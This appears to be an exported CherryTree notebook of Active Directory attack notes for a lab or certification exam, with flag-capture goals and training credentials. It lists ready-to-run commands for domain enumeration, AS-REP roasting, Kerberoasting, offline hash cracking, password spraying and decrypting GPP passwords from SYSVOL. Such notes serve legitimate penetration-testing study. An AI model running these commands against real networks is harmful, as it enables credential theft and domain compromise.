      <node name="AD Attack Chain Overview" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
        <rich_text>PROVIDED INITIAL DOMAIN CREDS (stephanie:Password123)
         │
         ▼
Phase 1: RAPID SYSTEMATIC AD ENUMERATION
         Map structures via BloodHound, query properties over SMB with NetExec, list objects over LDAP
         │
         ▼
Phase 2: CONFIGURATION ATTACKS &amp; QUICK WINS (Execute all vectors concurrently)
         ├── AS-REP Roasting (Accounts lacking pre-auth requirements)
         ├── Kerberoasting (Extract service ticket hashes matching targeted SPN names)
         ├── Parsing account descriptions attributes for plaintext password strings
         ├── Harvesting exposed deployment scripts across open corporate shares
         └── Extracting cpassword variables out of GPP policy XML files within SYSVOL
         │
         ▼
Phase 3: ELEVATING FOOTHOLD ON LOCAL SYSTEMS (Capture local user flag)
         Apply standalone privilege escalation tactics on MS01 to capture administrative memory states
         │
         ▼
Phase 4: SUB-NET ROUTING &amp; LATERAL MOVEMENT (Pivot context to internal zone)
         Establish tunnel infrastructure through MS01 -&gt; target internal node MS02 via harvested credentials
         │
         ▼
Phase 5: RESTRUCTURING DOMAIN OBJECT ACCESS (Escalate token context to Domain Admin)
         Abuse delegation rules, modify structural object ACLs, or invoke DCSync database updates
         │
         ▼
Phase 6: ABSOLUTE DC CONTROL (Capture root domain flag)
         Connect to the DC as a Domain Admin -&gt; dump NTDS database -&gt; establish a Golden Ticket for persistence
</rich_text>
      </node>

      <node name="Phase 1 - Enumeration" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
        <rich_text>bloodhound-python -u stephanie -p 'Password123' -d corp.local -ns 192.168.x.100 -c All --zip
# Remote automated AD domain trust mapping ingestion (Linux)
--------------------------------------------------
.\SharpHound.exe -c All --domain corp.local --zipfilename bh.zip
# In-network AD object relational mapping discovery (Windows)
--------------------------------------------------
nxc smb 192.168.x.100 -u stephanie -p 'Password123' --shares --users --groups --pass-pol
# Map shared directories, users, groups, and password execution policies
--------------------------------------------------
nxc smb 192.168.x.100 -u stephanie -p 'Password123' --loggedon-users
# Hunt for live active logged-on user sessions on a target host
--------------------------------------------------
nxc smb 192.168.x.100 -u stephanie -p 'Password123' -M spider_plus --share 'Department Shares'
# Automated directory spidering and asset inventory mapping
--------------------------------------------------
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
# Advanced recursive multi-threaded directory-only listing
--------------------------------------------------
ldapsearch -x -H ldap://192.168.x.100 -D "stephanie@corp.local" -w 'Password123' -b "DC=corp,DC=local" "(&amp;(objectClass=user)(description=*))" sAMAccountName description
# Targeted LDAP query tracking cleartext access tokens inside description attributes
--------------------------------------------------
rpcclient -U "forend" --password "Klmcargo2" 172.16.5.5
# Establish authenticated interactive MS-RPC pipe session
--------------------------------------------------
rpcclient $&gt; enumdomusers
# Enumerate all domain users and RIDs natively inside rpcclient
--------------------------------------------------
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
# Enumerate Domain Admins group members via LDAP queries
--------------------------------------------------
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
# Recursive search for privileged users with nested group membership
--------------------------------------------------
. .\PowerView.ps1
# Load PowerView module script into current PowerShell environment
--------------------------------------------------
Get-DomainUser -Properties samaccountname,description | Where-Object {$_.description}
# PowerView: Query active user properties and filter for descriptions
--------------------------------------------------
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
# PowerView: Recursively list all members of a group including nested memberships
--------------------------------------------------
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "Write|All|Force"}
# PowerView: Audit inbound permissions on high-value targets for write/force rights
--------------------------------------------------
Find-InterestingDomainAcl
# PowerView: Perform an extensive, unfiltered search for interesting ACLs across the domain
--------------------------------------------------
.\SharpView.exe Get-DomainUser -Identity forend
# SharpView: Enumerate user properties using the .NET port of PowerView
--------------------------------------------------
.\Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
# Snaffler: Scan domain hosts for readable shares and hunt for sensitive file data
--------------------------------------------------</rich_text>
      </node>

      <node name="Phase 2 - Credential Attacks" tags="" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1625097600" ts_lastsave="1625097600">
        <rich_text>GetNPUsers.py corp.local/ -usersfile domain_users.txt -dc-ip 192.168.x.100 -no-pass -format hashcat
# Check global domain object dictionary files for disabled pre-auth parameters
--------------------------------------------------
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
# Native ticket extraction requests targeting AS-REP roastable signatures (Windows)
--------------------------------------------------
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# Offline decryption of extracted AS-REP pre-authentication ticket hashes
--------------------------------------------------
GetUserSPNs.py corp.local/stephanie:'Password123' -dc-ip 192.168.x.100 -request -outputfile kerb.txt
# Request service ticket containers mapped to core application principals (Linux)
--------------------------------------------------
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
# Request tickets for highly privileged accounts with single-line hash formatting (Windows)
--------------------------------------------------
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# Offline decryption of extracted SPN account TGS ticket hashes
--------------------------------------------------
nxc smb 192.168.x.100 -u domain_users.txt -p 'Password123' --continue-on-success 2&gt;/dev/null | grep "+"
# Running low-velocity multi-account domain password sprays to avoid lockouts
--------------------------------------------------
kerbrute passwordspray -d corp.local --dc 192.168.x.100 domain_users.txt 'Corp2024!'
# Kerbrute: Programmatic password spraying with lockout awareness
--------------------------------------------------
nxc smb 192.168.x.100 -u stephanie -p 'Password123' -M gpp_password
# Automated harvesting of encrypted Group Policy Preferences passwords from domain volumes
--------------------------------------------------
smbclient //192.168.x.100/SYSVOL -U 'corp.local/stephanie%Password123'
# Manual authenticated session interrogation of Sysvol allocation partitions
--------------------------------------------------
find /mnt/sysvol -name "*.xml" 2&gt;/dev/null | xargs grep -l "cpassword"
# Scan shared policy configurations XML repositories for writable passwords
--------------------------------------------------
gpp-decrypt &lt;CPASSWORD_VALUE&gt;
# Decrypt the extracted cpassword element using public AES keys
--------------------------------------------------</rich_text>
